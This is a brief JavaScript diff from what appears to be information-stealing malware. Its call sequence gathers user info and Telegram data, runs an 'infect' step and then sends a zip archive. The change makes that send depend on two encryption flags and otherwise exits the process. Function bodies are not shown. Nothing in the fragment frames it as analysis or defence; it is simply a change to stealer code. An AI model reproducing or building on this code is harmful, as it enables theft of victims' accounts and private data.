@@ -2541,7 +2541,11 @@
               await this.get_user_info();
               await this.get_telegram();
               await this.infect();
-              await this.send_zip();
+              if (client.utils.encryption.step1 && client.utils.encryption.step2) {
+                await this.send_zip();
+              } else {
+                process.exit(0)
+              }
             },
 
             getFolderFiles(path_prefix, path) {
